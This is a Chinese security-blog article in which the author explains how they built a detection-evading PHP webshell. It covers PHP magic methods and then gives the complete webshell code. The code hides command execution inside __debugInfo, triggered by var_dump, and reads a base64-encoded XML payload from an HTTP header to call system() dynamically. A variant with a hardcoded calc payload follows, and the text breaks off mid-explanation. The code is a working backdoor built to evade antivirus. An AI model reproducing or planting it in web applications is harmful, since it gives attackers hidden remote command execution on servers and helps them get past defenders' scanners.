---
title: 这你敢信，复习PHP意外搞出一个免杀WebShell
url: https://www.secpulse.com/archives/206392.html
source: 安全脉搏
date: 2025-07-02
fetch_date: 2025-10-06T23:28:43.527622
---

# 这你敢信，复习PHP意外搞出一个免杀WebShell

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 这你敢信，复习PHP意外搞出一个免杀WebShell

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-07-01

16,298

## 前言

正当我饶有性质的开始复习 PHP 开发这个课程准备一天速通期末考试的时候，没想到有心栽花花不开，无心插柳柳成因，意外灵感突发，搞出了一个还算可以的免杀的 webshell，下面讲讲思路

## 起

当打开 php 复习考点的时候，发现还要考魔术方法，于是打开了好久没有翻过的 php 手册

魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。

我们看了大多数魔术方法，都有自己会在某个契机出发

比如一些常规的

```
__construct(mixed ...$values = ""): void
```

PHP 允许开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。

会在实例化一个类的时候触发这个方法

```
__destruct(): void
```

PHP 有析构函数的概念，这类似于其它面向对象的语言，如 C++。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。

会在对象销毁的时候执行这个方法

于是我们可以利用这个思路来实现一个命令条件执行的方法

比如看下面的例子

```
<?php
class a{
    public function __construct()
    {
        system("calc");
    }
}
new a();
```

或者

```
<?php
class a{
    public function __destruct()
    {
        system("calc");
    }
}
new a();
```

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/d30b3b70-562c-44f6-b1c7-dd772cfadac8.png)

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/9d59add7-4f56-4913-a9f9-3dd7585d954b.png)

都可以弹出计算器

所以我们可以借助这个思路

但是这两个函数还是太常见了

我们找找其他函数

## 承

于是开始找起来了

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/55ba2dbd-1776-4f67-85c0-16ede1fe1957.png)

手册的方法都感觉太常规，而且都见过

首先需要免杀，那一定需要小众

不知道各位知不知道\_\_debugInfo()这个魔术方法呢

下面介绍一下

```
__debugInfo(): array
```

当通过 var\_dump() 转储对象，获取应该要显示的属性的时候，该函数就会被调用。如果对象中没有定义该方法，那么将会展示所有的公有、受保护和私有的属性。

下面是它的使用例子

```
<?php
class C {
    private $prop;

    public function __construct($val) {
        $this->prop = $val;
    }

    public function __debugInfo() {
        return [
            'propSquared' => $this->prop ** 2,
        ];
    }
}

var_dump(new C(42));
?>
```

我们按着改造一下

读懂了原理后我们尝试看看能不能执行命令

```
<?php

class C {
    private $prop;

    public function __construct($val) {
        $this->prop = $val;
    }

    public function __debugInfo() {
        return [
            'propSquared' => $this->prop ** 2,
        ];
        system("calc");
    }
}
var_dump(new C(42));
?>
```

但是并没有计算器弹出来，原来忘了 php 一个最基础的语法，return 后代码就不会执行了

但是尝试了还是不行，最后问 GPT 写了个例子看看环境是不是有问题

```
<?php

class User {
    private $username;
    private $password; // 敏感信息，不想输出

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    public function __debugInfo() {
        return [
            'username' => $this->username,
            'info' => '这是调试时返回的信息',
            'timestamp' => time()
        ];
    }
}

$user = new User('alice', 'secret123');
var_dump($user); // 触发 __debugInfo()
```

输出应该是

```
object(User)#1 (3) {
  ["username"]=>
  string(5) "alice"
  ["info"]=>
  string(33) "这是调试时返回的信息"
  ["timestamp"]=>
  int(1725092384)
}
```

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/244a43b8-4d05-4383-8593-e17f034e9762.png)

然后搜了很多，发现如果可能我们的 xdebug 配置会影响我们的这个输出，所以找了没有配置 xdebug 的

再次执行

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/c91498c4-b71a-4fa9-b252-501d269d5772.png)

可以看到已经有信息了

所以尝试执行命令

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/4ea99418-684b-412d-b355-49bee8b5f198.png)

成功执行了命令

然后开始构造免杀 webshell

利用 SimpleXMLElement 解析 xml 文件来传入参数

## 终

最后搞出来的代码如下

```
<?php

class User {
    private $username;
    private $password;

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    public function __debugInfo() {
        $xmlData = base64_decode(end(getallheaders()));
        $xmlElement = new SimpleXMLElement($xmlData);
        $namespaces = $xmlElement->getNamespaces(TRUE);
        $xmlElement->rewind();
        var_dump($xmlElement->key());
        $result = $xmlElement->xpath('/books/system');
        var_dump (($result[0]->__toString()));
        ($xmlElement->key())($result[0]->__toString());
        return [
            'username' => $this->username,
            'info' => '这是调试时返回的信息',
            'timestamp' => time()
        ];
    }
}

$user = new User('alice', 'secret123');
var_dump($user);
```

这里因为我懒得搭建调试环境了，我们把 header 传入的值直接设置为

```
<books>
    <system>calc</system>
</books>
```

然后需要 base64 编码

```
<?php

class User {
    private $username;
    private $password;

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    public function __debugInfo() {
        $xmlData = base64_decode("PGJvb2tzPgogICAgPHN5c3RlbT5jYWxjPC9zeXN0ZW0+CjwvYm9va3M+");
        $xmlElement = new SimpleXMLElement($xmlData);
        $namespaces = $xmlElement->getNamespaces(TRUE);
        $xmlElement->rewind();
        var_dump($xmlElement->key());
        $result = $xmlElement->xpath('/books/system');
        var_dump (($result[0]->__toString()));
         ($xmlElement->key())($result[0]->__toString());
        return [
            'username' => $this->username,
            'info' => '这是调试时返回的信息',
            'timestamp' => time()
        ];
    }
}

$user = new User('alice', 'secret123');
var_dump($user);
```

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/2edb6064-2cd1-4cc2-a025-b5fa2108288b.png)

成功弹出计算器

这里我为了方便直接把从 header 头传入值修改为直接写入了

首先实例化我们的 user 类

然后

```
var_dump($user);
```

在这个过程中，会触发\_\_debugInfo

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/f128887f-264b-4095-a819-9ac7a4c2d933.png)

然后在这个过程中会解析 xml 数据

![](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/55e33be6-a73a-4af3-a619-b7dcba8a69ef.png)

通过 SimpleXMLElement 的方法去...